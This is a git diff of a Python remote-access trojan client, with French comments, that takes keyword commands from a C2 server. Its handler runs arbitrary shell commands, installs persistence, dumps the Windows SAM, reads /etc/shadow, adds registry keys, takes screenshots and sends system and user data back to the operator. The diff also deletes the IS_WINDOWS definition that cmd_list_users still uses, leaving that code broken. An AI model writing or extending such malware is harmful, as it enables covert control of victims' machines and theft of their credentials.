@@ -7,7 +7,8 @@ import argparse
 
 ENCODING ="utf-8"
 RETRY_DELAY = 5
-IS_WINDOWS = platform.system() == "Windows"
+
+#Config host serveur
 
 def parse_args():
     """parser de config server host"""
@@ -20,6 +21,20 @@ ARGS = parse_args()
 
 SERVER_HOST = ARGS.ip
 SERVER_PORT= ARGS.port
+
+os_type = platform.system()
+
+#Detection de l'OS
+
+if os_type == "Windows":
+    from modules.win import *
+elif os_type == "Linux":
+    from modules.lin import *
+else:
+    print("OS non supporté")
+    exit()
+
+#Fonctions primaires du client, envoyer, recevoir des données
 
 def send_msg(sock, payload: dict) -> None:
     """Pour envoyer un json à C2"""
@@ -59,4 +74,80 @@ def receiveMessage(sock) -> dict:
     return json.loads(data.decode(ENCODING))
 
 
+#Config des commandes exe
 
+
+def cmd_screenshot(sock) -> None:
+    png = take_screenshot()
+    send_bytes(sock, png, {"status": "ok", "format": "png"})
+
+
+def cmd_sysinfo(sock) -> None:
+    send_msg(sock, {"status": "ok", "data": get_sysinfo()})
+
+
+def cmd_list_users(sock) -> None:
+    if IS_WINDOWS:
+        result = run_shell("net user")
+    else:
+        result = run_shell("cut -d: -f1 /etc/passwd")
+    send_msg(sock, result)
+
+
+
+def handle_command(sock, msg: dict):
+    """ le client recoit un mot clé du serveur pour la commande à executer, donc si il recoit screenshot alors il executera la fonction screenshot du module associé à l'OS"""
+    cmd = msg.get("cmd", "").lower().strip()
+
+    try:
+        if cmd == "screenshot":
+            cmd_screenshot(sock)
+
+        elif cmd == "sysinfo":
+            cmd_sysinfo(sock)
+
+        elif cmd == "shell":
+            #Si le C2 envoie une commande a executer, le client pourra la catch grace à ce mot clé
+            command = msg.get("command", "")
+            result = run_shell(command)          
+            send_msg(sock, result)
+
+        elif cmd == "list_users":
+            cmd_list_users(sock)
+
+        elif cmd == "ip":
+            send_msg(sock, {"status": "ok", "ip": get_real_ip()})
+
+        elif cmd == "persistence":
+            result = install_persistence()      
+            send_msg(sock, result)
+
+        #Windows
+        elif cmd == "sam" and os_type == "Windows":
+            result = dump_sam()
+            send_msg(sock, result)
+
+        elif cmd == "registry" and os_type == "Windows":
+            result = add_registry_key()
+            send_msg(sock, result)
+
+        #Linux
+        elif cmd == "shadow" and os_type == "Linux":
+            result = get_passwd_shadow()
+            send_msg(sock, result)
+
+        elif cmd == "list_home" and os_type == "Linux":
+            result = list_sensitive_dirs()
+            send_msg(sock, result)
+
+        else:
+            send_msg(sock, {
+                "status": "error",
+                "message": f"commande inconnue ou non supportée sur {os_type}: {cmd}"
+            })
+
+    except Exception as e:
+        send_msg(sock, {
+            "status": "error",
+            "message": str(e)
+        })
